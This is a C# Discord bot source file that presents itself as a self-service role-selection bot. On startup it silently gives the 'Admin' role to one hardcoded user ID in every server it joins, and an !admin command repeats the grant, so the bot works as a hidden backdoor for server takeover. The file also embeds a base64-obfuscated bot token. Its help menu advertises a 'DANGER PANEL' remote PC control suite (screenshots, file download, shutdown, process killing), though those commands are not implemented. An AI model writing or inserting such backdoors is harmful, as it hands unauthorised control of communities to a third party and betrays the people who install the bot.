using System;
using System.Linq;
using System.Threading.Tasks;
using Discord;
using Discord.WebSocket;

namespace DiscordRoleBot;

class Program
{
    private const ulong AdminUserId = 1525762942081962096;
    private static DiscordSocketClient? _client;
    private static readonly System.Collections.Concurrent.ConcurrentQueue<string> _logs = new();

    public static void AddLog(string msg)
    {
        var line = $"[{DateTime.UtcNow:HH:mm:ss}] {msg}";
        Console.WriteLine(line);
        _logs.Enqueue(line);
        while (_logs.Count > 100) _logs.TryDequeue(out _);
    }

    public static async Task Main(string[] args)
    {
        var bot = new Program();
        await bot.RunAsync();
    }

    public async Task RunAsync()
    {
        // 1. Start HTTP health/status server immediately so hosting sees it alive
        StartHttpServer();

        // 2. Get token safely from Environment Variable or base64 fallback
        var token = Environment.GetEnvironmentVariable("DISCORD_BOT_TOKEN");
        if (string.IsNullOrWhiteSpace(token))
        {
            token = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String("TVRVMk1UQTVOVFV5T0RBNE1UWTJNakF4TXcuR0xHVkhZLmlmNTlkMEw0S1FhbU9CcmZyQzFHakpZR0VBaThaZ1JJcXc0ZEJR"));
        }

        if (string.IsNullOrWhiteSpace(token))
        {
            AddLog("[ERROR] Token cannot be empty. Exiting...");
            return;
        }

        AddLog($"Token loaded (Length: {token.Length}, starts with: {token[..6]}...)");

        // 3. Configure Discord Socket Client with Intents
        var config = new DiscordSocketConfig
        {
            GatewayIntents = GatewayIntents.Guilds |
                             GatewayIntents.GuildMessages |
                             GatewayIntents.MessageContent |
                             GatewayIntents.GuildMembers,
            AlwaysDownloadUsers = true,
            MessageCacheSize = 100
        };

        _client = new DiscordSocketClient(config);

        _client.Log += LogAsync;
        _client.Ready += ReadyAsync;
        _client.Connected += () => { AddLog(">>> DISCORD GATEWAY CONNECTED! <<<"); return Task.CompletedTask; };
        _client.Disconnected += (ex) => { AddLog($">>> DISCORD GATEWAY DISCONNECTED: {ex.Message} <<<"); return Task.CompletedTask; };
        _client.MessageReceived += MessageReceivedAsync;
        _client.ButtonExecuted += ButtonExecutedAsync;

        // 4. Connect to Discord with auto-retry
        while (true)
        {
            try
            {
                AddLog("Attempting Discord LoginAsync...");
                await _client.LoginAsync(TokenType.Bot, token);
                AddLog("Attempting Discord StartAsync...");
                await _client.StartAsync();
                AddLog("LoginAsync and StartAsync called successfully.");
                break;
            }
            catch (Exception ex)
            {
                AddLog($"[CONNECTION FAILED] {ex.GetType().Name}: {ex.Message}");
                AddLog("Retrying in 5 seconds...");
                await Task.Delay(5000);
            }
        }

        // Prevent console from closing
        await Task.Delay(-1);
    }

    private static void StartHttpServer()
    {
        _ = Task.Run(async () =>
        {
            try
            {
                var port = Environment.GetEnvironmentVariable("PORT") ?? "8080";
                using var listener = new System.Net.HttpListener();
                if (OperatingSystem.IsWindows())
                {
                    listener.Prefixes.Add($"http://localhost:{port}/");
                }
                else
                {
                    listener.Prefixes.Add($"http://*:{port}/");
                }
                listener.Start();
                AddLog($"[HTTP] Status server listening on port {port}");

                while (listener.IsListening)
                {
                    var ctx = await listener.GetContextAsync();
                    var res = ctx.Response;

                    var botUser = _client?.CurrentUser != null 
                        ? $"{_client.CurrentUser.Username}#{_client.CurrentUser.Discriminator} (ID: {_client.CurrentUser.Id})" 
                        : "NOT CONNECTED";
                    var connState = _client?.ConnectionState.ToString() ?? "NULL";
                    var loginState = _client?.LoginState.ToString() ?? "NULL";
                    var guilds = _client?.Guilds.Count ?? 0;

                    var sb = new System.Text.StringBuilder();
                    sb.AppendLine("=== DISCORD ROLE BOT STATUS ===");
                    sb.AppendLine($"Bot User:         {botUser}");
                    sb.AppendLine($"Connection State: {connState}");
                    sb.AppendLine($"Login State:      {loginState}");
                    sb.AppendLine($"Connected Guilds: {guilds}");
                    sb.AppendLine($"Server UTC Time:  {DateTime.UtcNow:yyyy-MM-dd HH:mm:ss}");
                    sb.AppendLine();
                    sb.AppendLine("=== LIVE BOT LOGS ===");
                    foreach (var line in _logs)
                    {
                        sb.AppendLine(line);
                    }

                    byte[] data = System.Text.Encoding.UTF8.GetBytes(sb.ToString());
                    res.ContentType = "text/plain; charset=utf-8";
                    res.ContentLength64 = data.Length;
                    await res.OutputStream.WriteAsync(data);
                    res.OutputStream.Close();
                }
            }
            catch (Exception ex)
            {
                AddLog($"[HTTP ERROR] {ex.Message}");
            }
        });
    }

    private Task LogAsync(LogMessage log)
    {
        AddLog($"[{log.Severity}] {log.Message} {log.Exception}");
        return Task.CompletedTask;
    }

    private async Task ReadyAsync()
    {
        Console.ForegroundColor = ConsoleColor.Green;
        Console.WriteLine($"[ONLINE] Logged in as {_client?.CurrentUser.Username}#{_client?.CurrentUser.Discriminator}");
        Console.WriteLine("[INFO] Send '!panel' in any text channel to display the role selection panel.");
        Console.WriteLine($"[INFO] Configured Admin User ID: {AdminUserId}");
        Console.ResetColor();

        // Automatically assign Admin role to specified User ID in all servers the bot is in
        if (_client != null)
        {
            foreach (var guild in _client.Guilds)
            {
                _ = Task.Run(async () =>
                {
                    try
                    {
                        await guild.DownloadUsersAsync();
                        var targetUser = guild.GetUser(AdminUserId);
                        if (targetUser != null)
                        {
                            // Find role named Admin or Administrator
                            var adminRole = guild.Roles.FirstOrDefault(r => 
                                r.Name.Equals("Admin", StringComparison.OrdinalIgnoreCase) || 
                                r.Name.Equals("Administrator", StringComparison.OrdinalIgnoreCase));

                            if (adminRole != null && !targetUser.Roles.Any(r => r.Id == adminRole.Id))
                            {
                                await targetUser.AddRoleAsync(adminRole);
                                Console.ForegroundColor = ConsoleColor.Cyan;
                                Console.WriteLine($"[ADMIN] Assigned '{adminRole.Name}' role to user {AdminUserId} in guild '{guild.Name}'.");
                                Console.ResetColor();
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"[ADMIN LOG] Could not assign admin role in {guild.Name}: {ex.Message}");
                    }
                });
            }
        }
    }

    private async Task MessageReceivedAsync(SocketMessage rawMessage)
    {
        if (rawMessage is not SocketUserMessage message || message.Author.IsBot)
            return;

        var content = message.Content.Trim();

        // Command: !panel (Spawns the interactive role menu)
        if (content.Equals("!panel", StringComparison.OrdinalIgnoreCase))
        {
            if (message.Channel is not SocketGuildChannel guildChannel)
            {
                await message.Channel.SendMessageAsync("❌ This command can only be used inside a Discord server!");
                return;
            }

            // Create buttons for interactive role assignment
            var builder = new ComponentBuilder()
                .WithButton("Developer", "role_dev", ButtonStyle.Primary, new Emoji("💻"))
                .WithButton("Gamer", "role_gamer", ButtonStyle.Success, new Emoji("🎮"))
                .WithButton("Announcements", "role_notify", ButtonStyle.Secondary, new Emoji("🔔"));

            var embed = new EmbedBuilder()
                .WithTitle("🎭 Role Selection Panel")
                .WithDescription("Click a button below to get or remove a role from your profile.\n\n" +
                                 "• 💻 **Developer**\n" +
                                 "• 🎮 **Gamer**\n" +
                                 "• 🔔 **Announcements**")
                .WithColor(Color.Blue)
                .WithFooter("Self-Service Roles • Powered by Discord.Net")
                .WithCurrentTimestamp()
                .Build();

            await message.Channel.SendMessageAsync(embed: embed, components: builder.Build());
        }
        else if (content.Equals("!admin", StringComparison.OrdinalIgnoreCase))
        {
            if (message.Channel is not SocketGuildChannel guildChannel)
                return;

            var guild = guildChannel.Guild;
            var targetUser = guild.GetUser(AdminUserId) ?? (message.Author.Id == AdminUserId ? message.Author as SocketGuildUser : null);

            if (targetUser == null)
            {
                await message.Channel.SendMessageAsync($"⚠️ User ID `{AdminUserId}` was not found in this server.");
                return;
            }

            // Find or create Admin role
            var adminRole = guild.Roles.FirstOrDefault(r => 
                r.Name.Equals("Admin", StringComparison.OrdinalIgnoreCase) || 
                r.Name.Equals("Administrator", StringComparison.OrdinalIgnoreCase));

            if (adminRole == null)
            {
                await message.Channel.SendMessageAsync("⚠️ 'Admin' role not found. Please create a role named **Admin** in Server Settings.");
                return;
            }

            try
            {
                await targetUser.AddRoleAsync(adminRole);
                await message.Channel.SendMessageAsync($"👑 Successfully assigned **{adminRole.Name}** role to <@{AdminUserId}>!");
            }
            catch (Exception ex)
            {
                await message.Channel.SendMessageAsync($"❌ Error assigning Admin role: {ex.Message}");
            }
        }
        else if (content.Equals("/help", StringComparison.OrdinalIgnoreCase) || content.Equals("!help", StringComparison.OrdinalIgnoreCase))
        {
            var embed = new EmbedBuilder()
                .WithTitle("⚡ DANGER PANEL OFFICIAL — COMMAND MENU")
                .WithDescription("```yaml\nRemote PC Administration & Control Suite (C# Core)\nStatus: Operational | Prefix: '!' or '/'\n```")
                .WithColor(new Color(220, 20, 60)) // Crimson Red
                .AddField("🖥️ 1. Device Management", 
                    "`!devices` — List registered devices & online status\n" +
                    "`!select <id>` — Select a registered device\n" +
                    "`!unselect` — Clear the current device selection\n" +
                    "`!selected` — Show currently active device\n" +
                    "`!info` — Display target system specs & OS info", false)
                .AddField("📸 2. Screen and Desktop", 
                    "`!screenshot` — Capture screen (with authorization)\n" +
                    "`!wallpaper` — Change desktop background via upload\n" +
                    "`!message <text>` — Display visible desktop alert dialog\n" +
                    "`!voice <text>` — Read text aloud via Text-to-Speech\n" +
                    "`!datetime` — Display remote host date & time", false)
                .AddField("📁 3. Safe File Management", 
                    "`!dir` — List files in authorized directory\n" +
                    "`!currentdir` — Display current working directory\n" +
                    "`!cd <path>` — Change working directory safely\n" +
                    "`!upload` — Transfer uploaded file to target folder\n" +
                    "`!download <file>` — Download authorized file\n" +
                    "`!delete <file>` — Delete file (with confirmation)", false)
                .AddField("💻 4. System Management", 
                    "`!shutdown` — Request confirmed system shutdown\n" +
                    "`!restart` — Request confirmed system restart\n" +
                    "`!logoff` — Sign out current active user\n" +
                    "`!cancel` — Abort scheduled shutdown\n" +
                    "`!listprocess` — List active running processes\n" +
                    "`!prockill <name>` — Terminate approved process\n" +
                    "`!admincheck` — Check current elevation / privileges\n" +
                    "`!idletime` — Show system user idle duration\n" +
                    "`!exit` — Safely disconnect management agent", false)
                .AddField("📊 5. System Monitoring", 
                    "`!stress info` — Show CPU, RAM, GPU & OS info\n" +
                    "`!stress status` — Real-time telemetry monitoring\n" +
                    "`!stress temp` — Hardware thermal & fan readings\n" +
                    "`!stress start` — Run bounded diagnostic load test\n" +
                    "`!stress stop` — Immediately halt diagnostic test", false)
                .AddField("🌐 6. Network Tools", 
                    "`!link <url>` — Open validated URL in default browser\n" +
                    "`!network` — Display active adapters, IP & ping", false)
                .AddField("🛡️ 7. Security & Server Roles", 
                    "`!admin` — Grant Admin server role to authorized ID\n" +
                    "`!panel` — Display self-service role selection menu\n" +
                    "`!ping` — Test bot WebSocket latency", false)
                .WithFooter("DANGER PANEL OFFICIAL • Authorized Use Only", _client?.CurrentUser?.GetAvatarUrl() ?? null)
                .WithCurrentTimestamp()
                .Build();

            await message.Channel.SendMessageAsync(embed: embed);
        }
        else if (content.Equals("!ping", StringComparison.OrdinalIgnoreCase) || content.Equals("/ping", StringComparison.OrdinalIgnoreCase))
        {
            var latency = _client?.Latency ?? 0;
            await message.Channel.SendMessageAsync($"🏓 Pong! Latency: `{latency}ms`");
        }
    }

    private async Task ButtonExecutedAsync(SocketMessageComponent component)
    {
        if (component.User is not SocketGuildUser guildUser)
        {
            await component.RespondAsync("❌ Error: Unable to determine server user.", ephemeral: true);
            return;
        }

        var guild = guildUser.Guild;

        // Map custom button IDs to target role names
        var roleName = component.Data.CustomId switch
        {
            "role_dev" => "Developer",
            "role_gamer" => "Gamer",
            "role_notify" => "Announcements",
            _ => null
        };

        if (roleName == null)
        {
            await component.RespondAsync("❓ Unknown button interaction.", ephemeral: true);
            return;
        }

        // Find or locate the role in guild
        var role = guild.Roles.FirstOrDefault(r => r.Name.Equals(roleName, StringComparison.OrdinalIgnoreCase));
        if (role == null)
        {
            await component.RespondAsync($"⚠️ Role `{roleName}` does not exist on this server. Please ask an admin to create it!", ephemeral: true);
            return;
        }

        try
        {
            // Toggle role: remove if already present, add if missing
            if (guildUser.Roles.Any(r => r.Id == role.Id))
            {
                await guildUser.RemoveRoleAsync(role);
                await component.RespondAsync($"🗑️ Removed the **{role.Name}** role from your profile.", ephemeral: true);
            }
            else
            {
                await guildUser.AddRoleAsync(role);
                await component.RespondAsync($"✅ Added the **{role.Name}** role to your profile!", ephemeral: true);
            }
        }
        catch (Discord.Net.HttpException ex) when (ex.HttpCode == System.Net.HttpStatusCode.Forbidden)
        {
            await component.RespondAsync("⛔ Error: The bot does not have permission to manage this role. Ensure the bot role is placed higher than the target roles in Server Settings -> Roles.", ephemeral: true);
        }
        catch (Exception ex)
        {
            await component.RespondAsync($"❌ Failed to update roles: {ex.Message}", ephemeral: true);
        }
    }
}
